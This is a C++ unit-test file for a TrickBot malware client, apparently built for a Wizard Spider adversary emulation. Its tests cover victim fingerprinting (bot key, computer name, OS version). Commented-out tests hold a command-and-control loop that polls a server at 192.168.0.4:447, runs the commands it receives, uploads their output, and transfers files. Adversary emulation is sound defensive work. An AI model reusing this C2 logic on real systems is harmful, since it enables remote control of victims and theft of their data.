#include "pch.h"
#include "../TrickBotClientExe/TbComms.h"

struct TrickBotTest : testing::Test
{
	TbComms* tbCommsTest;
	TrickBotTest() {
		tbCommsTest = new TbComms;
	}

	~TrickBotTest() {
		delete tbCommsTest;
	}
};
TEST_F(TrickBotTest, CanGetInterface) {
	EXPECT_STREQ("{B482D9BD-03B7-42D1-8484-F24F08F7C13D}", tbCommsTest->getInterface()->AdapterName);
}
TEST_F(TrickBotTest, CanGenBotKey) {
	EXPECT_STREQ("9CD76C0730B980B292D7A835FE5F9D21525E459BF2C317579A75F33857175EAB", tbCommsTest->getBotKey(tbCommsTest->getInterface()).c_str());
}
TEST_F(TrickBotTest, CanGetComputerName) {
	EXPECT_STREQ("dragon", tbCommsTest->getComputerName().c_str());
}
TEST_F(TrickBotTest, CanGenRandomString) {
	int size = 32;
	EXPECT_EQ(size, tbCommsTest->genRandomString(size).length());
}
TEST_F(TrickBotTest, CanGetOsVersion) {
	EXPECT_STREQ("602931718", tbCommsTest->getOsVersion().c_str());
}
TEST_F(TrickBotTest, CanGenClientId) {
	EXPECT_PRED_FORMAT2(testing::IsSubstring, "dragon_W602931718.", tbCommsTest->getClientId().c_str());
}
TEST_F(TrickBotTest, CanGetCWD) {
	EXPECT_STREQ("C:\\Users\\spagano\\Documents\\wizard_spider\\Resources\\TrickBot\\TrickBotClientExe\\x64\\Debug", tbCommsTest->getCWD().c_str());
}
TEST_F(TrickBotTest, CanGetPID) {
	EXPECT_PRED_FORMAT2(testing::IsSubstring, "", tbCommsTest->getPID().c_str());
}
TEST_F(TrickBotTest, CanGetPPID) {
	EXPECT_PRED_FORMAT2(testing::IsSubstring, "", tbCommsTest->getPPID().c_str());
}

TEST_F(TrickBotTest, CanGenRegistrationRequest) {
	EXPECT_PRED_FORMAT2(testing::IsSubstring, "/camp1/dragon_W602931718.", tbCommsTest->genRegistrationRequest().c_str());
}

 //onlly tests that wubexec fired and not that the client recieved a 200
 //TEST_F(TrickBotTest, CanSendGet) {
 //	string ip = "192.168.0.4";
 //	string port = "447";
 //	string data = tbCommsTest->genRegistrationRequest();
 //	EXPECT_EQ(33, tbCommsTest->sendGet(ip, port, data));
 //}

 //TEST_F(TrickBotTest, CanPostCmdOutput) {
	// string ip = "192.168.0.4";
	// string port = "447";
	// string output = "this is command output";
	// string regout = tbCommsTest->sendGet(ip, port, tbCommsTest->genRegistrationRequest());
	// tbCommsTest->sendPost(ip, port, tbCommsTest->genPostCmdOutputRequest(), output);


	// //add check to get command output if possible
 //}

 //TEST_F(TrickBotTest, CanUploadFile) {
	// string ip = "192.168.0.4";
	// string port = "447";
	// string endpoint = tbCommsTest->genUploadFileRequest();
	// string output = "this is command output";
	// EXPECT_EQ(33, tbCommsTest->sendPost(ip, port, endpoint, output));
 //}

 //TEST_F(TrickBotTest, CanDownloadFile) {
	// string ip = "192.168.0.4";
	// string port = "447";
	// string filename = "hello_world.elf";
	// string reg = tbCommsTest->genRegistrationRequest();
	// string regout = tbCommsTest->sendGet(ip, port, reg);
	// string endpoint = tbCommsTest->genDownloadFileRequest(filename);
	// tbCommsTest->sendGetFile(ip, port, endpoint, filename);
	 /*LPSTR filedata = tbCommsTest->sendGet(ip, port, endpoint);
	 printf(filedata);
	 if (strcmp(filedata,"404 page not found\n") == 0) {
		 tbCommsTest->sendPost(ip, port, tbCommsTest->genPostCmdOutputRequest(), "Get file: " + filename + " failed " + filedata);
	 }
	 else {
		 tbCommsTest->writeFile(filename, filedata);
		 tbCommsTest->sendPost(ip, port, tbCommsTest->genPostCmdOutputRequest(), "Wrote File: " + filename );
	 }*/
 //}
/*TEST_F(TrickBotTest, CanGetTasks) {
	string ip = "192.168.0.4";
	string port = "447";
	string reg = tbCommsTest->genRegistrationRequest();
	string regout = tbCommsTest->sendGet(ip, port, reg);
	string gettask = tbCommsTest->genGetTaskRequest();
	
	LPSTR getter;
	char cmdDelim[] = "/50/cmd=";
	char* pCmd;
	char getFileDelim[] = "get-file ";
	char* pGetFile;
	char uploadFileDelim[] = "upload-file ";
	char* pUploadFile;
	char dieDelim[] = "die";
	char* pDie;
	while(true){
		getter = tbCommsTest->sendGet(ip, port, gettask);
		printf("%s\n", getter);
		pCmd = strstr(getter, cmdDelim);
		if(pCmd){
			pDie = strstr(getter, dieDelim);
			if (pDie) {
				exit(EXIT_SUCCESS);
			}

			else if (strstr(getter, getFileDelim)) {
				printf("calling get file");
				pGetFile = strstr(getter, getFileDelim);
				int len = strlen(pGetFile) - strlen(getFileDelim);
				char* dest = (char*)malloc(sizeof(char) * (len + 1));

				for (int i = strlen(getFileDelim); i < strlen(pGetFile) && (*(pGetFile + i) != '\0'); i++)
				{
					*dest = *(pGetFile + i);
					dest++;
				}
				*dest = '\0';
				string filename = dest - len;
				printf(filename.c_str());
				string endpoint = tbCommsTest->genDownloadFileRequest(filename.c_str());
				tbCommsTest->sendGetFile(ip, port, endpoint, filename);
			}

			else if (strstr(getter, uploadFileDelim)) {
				printf("calling put file");
			}

			else {
				string cmdOutput = "";
				int len = strlen(pCmd) - strlen(cmdDelim);
				char* dest = (char*)malloc(sizeof(char) * (len + 1));

				for (int i = strlen(cmdDelim); i < strlen(pCmd) && (*(pCmd + i) != '\0'); i++)
				{
					*dest = *(pCmd + i);
					dest++;
				}
				*dest = '\0';
				cmdOutput = tbCommsTest->executeCommand(dest - len);
				if (cmdOutput != "") {
					tbCommsTest->sendPost(ip, port, tbCommsTest->genPostCmdOutputRequest(), cmdOutput);
				}
			}
			
		}
		Sleep(5000);

	}
}*/

int main(int argc, char* argv[]) {
	testing::InitGoogleTest(&argc, argv);
	return RUN_ALL_TESTS();
}